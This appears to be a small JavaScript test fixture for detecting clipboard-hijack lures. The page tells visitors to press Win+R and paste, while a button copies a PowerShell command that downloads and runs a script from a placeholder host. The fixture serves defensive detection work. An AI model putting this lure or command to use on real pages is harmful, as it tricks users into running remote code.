// Static detection fixture. Never execute the copied command.
document.body.textContent = 'Press Win+R, paste the command, then press Enter.';
document.querySelector('button').addEventListener('click', () => {
    navigator.clipboard.writeText("iex (irm https://example.invalid/resource.ps1)");
});
